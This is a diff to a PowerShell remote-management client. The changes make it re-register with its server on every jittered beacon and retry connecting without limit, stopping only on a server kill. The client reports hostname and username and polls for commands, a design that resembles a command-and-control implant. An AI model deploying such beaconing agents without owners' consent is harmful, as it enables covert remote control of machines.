@@ -135,6 +135,7 @@ $baseSleepSeconds = 60          # Default 1 minute
 $jitterPercent = 30             # Default 30% jitter
 $maxRetries = 3
 $currentRetry = 0
+$script:RmmEverRegistered = $false
 
 # Persistent HTTP: $false = no shared CookieContainer (default). $true = reuse cookies across calls.
 # Env RMM_PERSISTENT_HTTP (1/true/yes/on) overrides this when the variable is set and non-empty.
@@ -672,9 +673,60 @@ function Invoke-RmmUserCommand {
     }
 }
 
-# Register with RMM server
+function Get-RmmWebExceptionResponse {
+    param($ErrorRecord)
+    $ex = $ErrorRecord.Exception
+    if ($ex.InnerException -is [System.Net.WebException]) {
+        $ex = $ex.InnerException
+    }
+    if ($ex -is [System.Net.WebException] -and $ex.Response) {
+        return $ex.Response
+    }
+    return $null
+}
+
+function Test-RmmSessionTerminated {
+    param($ErrorRecord)
+    try {
+        $resp = Get-RmmWebExceptionResponse -ErrorRecord $ErrorRecord
+        if (-not $resp -or [int]$resp.StatusCode -ne 403) { return $false }
+        $body = Get-RmmHttpErrorBody -Response $resp
+        return ($body -match 'TERMINATED')
+    } catch {}
+    return $false
+}
+
+function Register-RmmSession {
+    param(
+        [switch]$Quiet,
+        [switch]$Reconnect
+    )
+    $registerUrl = "$u/register?id=$sessionId&h=$computerName&u=$userName"
+    $headers = Get-RmmRequestHeaders
+    Write-RmmLog "Register GET $registerUrl (beacon=$([bool]$beaconSecret))" -Level DEBUG
+    try {
+        $null = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
+        $script:RmmEverRegistered = $true
+        if (-not $Quiet) {
+            if ($Reconnect) {
+                Write-Host "[+] Reconnected to RMM server (ID: $sessionId)" -ForegroundColor Green
+            } else {
+                Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
+            }
+        }
+        return $true
+    } catch {
+        if (Test-RmmSessionTerminated -ErrorRecord $_) {
+            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
+            exit 0
+        }
+        throw
+    }
+}
+
+# Register with RMM server (retries until success; default = no limit)
 $registered = $false
-$retryCount = 0
+$registerAttempt = 0
 
 Write-Host "[*] Starting RMM client with Session ID: $sessionId" -ForegroundColor Cyan
 Write-Host "[*] Server URL: $u" -ForegroundColor Cyan
@@ -689,45 +741,27 @@ if ($script:RmmVerbose) {
     Write-Host "[*] Tip: set RMM_VERBOSE=1 for per-request URL, wire IP, and error bodies" -ForegroundColor DarkGray
 }
 Write-Host "[*] Default beacon: $baseSleepSeconds seconds with $jitterPercent% jitter" -ForegroundColor Cyan
+Write-Host "[*] Connection failures retry indefinitely (only explicit server kill or __EXIT__ stops the client)" -ForegroundColor DarkGray
 if ($script:UsePersistentHttp) {
     Write-Host "[*] HTTP: persistent cookies + TCP keep-alive. IPv4-only. Clear RMM_PERSISTENT_HTTP / set `$persistentHttp = `$false` for default." -ForegroundColor DarkGray
 } else {
     Write-Host "[*] HTTP: IPv4-only; KeepAlive=false (TCP usually closes after each request). Persistent: `$persistentHttp = `$true` or RMM_PERSISTENT_HTTP=1." -ForegroundColor DarkGray
 }
 
-while (-not $registered -and $retryCount -lt $maxRetries) {
+while (-not $registered) {
+    $registerAttempt++
     try {
-        $registerUrl = "$u/register?id=$sessionId&h=$computerName&u=$userName"
-        $headers = Get-RmmRequestHeaders
-        Write-RmmLog "Register GET $registerUrl (beacon=$([bool]$beaconSecret))" -Level DEBUG
-
-        $response = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
-        Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
-        $registered = $true
+        $registered = Register-RmmSession
         $currentRetry = 0
     } catch {
-        $forbidden = $false
-        try {
-            $resp = $_.Exception.Response
-            if (-not $resp -and $_.Exception.InnerException) {
-                $resp = $_.Exception.InnerException.Response
-            }
-            if ($resp -and [int]$resp.StatusCode -eq 403) { $forbidden = $true }
-        } catch {}
-        if ($forbidden) {
-            Write-Host "[*] Session was terminated on the server; exiting" -ForegroundColor Yellow
+        if (Test-RmmSessionTerminated -ErrorRecord $_) {
+            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
             exit 0
         }
-        $retryCount++
-        Write-Host "[-] Registration failed (attempt $retryCount/$maxRetries): $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[-] Registration failed (attempt $registerAttempt, retrying): $($_.Exception.Message)" -ForegroundColor Red
         Write-RmmHttpFailure -ErrorRecord $_ -Context "register"
-        if ($retryCount -lt $maxRetries) {
-            $backoffTime = Get-BackoffSleep -retryCount $retryCount
-            Write-Host "[*] Retrying in $backoffTime seconds..." -ForegroundColor Yellow
-        } else {
-            Write-Host "[-] Registration failed after $maxRetries attempts, exiting" -ForegroundColor Red
-            exit 1
-        }
+        $backoffTime = Get-BackoffSleep -retryCount $registerAttempt
+        Write-Host "[*] Server unreachable — retrying registration in $backoffTime seconds..." -ForegroundColor Yellow
     }
 }
 
@@ -736,7 +770,10 @@ while ($true) {
     try {
         # Add jitter before each poll cycle
         $actualSleep = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
-        
+
+        # Re-register each beacon so a restarted server re-creates the session before /cmd.
+        Register-RmmSession -Quiet | Out-Null
+
         $headers = Get-RmmRequestHeaders
         $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
         
@@ -970,16 +1007,29 @@ while ($true) {
         }
         
     } catch {
-        # Exponential backoff with jitter on failure
+        if (Test-RmmSessionTerminated -ErrorRecord $_) {
+            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
+            exit 0
+        }
+
+        Write-Host "[!] Communication error (retrying indefinitely): $($_.Exception.Message)" -ForegroundColor Yellow
+        Write-RmmHttpFailure -ErrorRecord $_ -Context "beacon"
+
+        try {
+            if (Register-RmmSession -Quiet -Reconnect) {
+                $currentRetry = 0
+                continue
+            }
+        } catch {
+            Write-RmmHttpFailure -ErrorRecord $_ -Context "re-register"
+        }
+
         $currentRetry++
         $backoffTime = Get-BackoffSleep -retryCount $currentRetry
-        
         if ($currentRetry -le $maxRetries) {
-            Write-Host "[!] Communication error (attempt $currentRetry/$maxRetries): $_" -ForegroundColor Yellow
-            Write-Host "[*] Backing off for $backoffTime seconds..." -ForegroundColor Yellow
+            Write-Host "[*] Backing off $backoffTime seconds, then retry (attempt $currentRetry/$maxRetries)..." -ForegroundColor Yellow
         } else {
-            Write-Host "[-] Max retries exceeded, continuing with longer jitter..." -ForegroundColor Red
-            Get-JitteredSleep -baseSeconds 30 -jitterPercent 50
+            Write-Host "[*] Server still down — long backoff $backoffTime seconds, then retry..." -ForegroundColor Yellow
             $currentRetry = 0
         }
     }
